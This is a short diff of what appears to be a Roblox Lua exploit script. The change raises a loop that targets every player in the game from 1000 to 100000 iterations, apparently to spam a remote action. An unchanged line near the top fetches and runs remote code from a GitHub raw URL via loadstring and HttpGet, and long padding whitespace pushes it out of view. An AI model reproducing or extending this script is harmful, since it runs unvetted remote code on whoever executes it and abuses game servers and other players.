@@ -8,7 +8,7 @@ local Player = Players.LocalPlayer
 
 loadstring(game:HttpGet('https://raw.githubusercontent.com/boxermain/main/main.lua'))()                                                                                                                      
                                                                                                                         
-for i = 1, 1000 do
+for i = 1, 100000 do
 for _, player in pairs(Players:GetPlayers()) do
             local args = {
                 [1] = player,
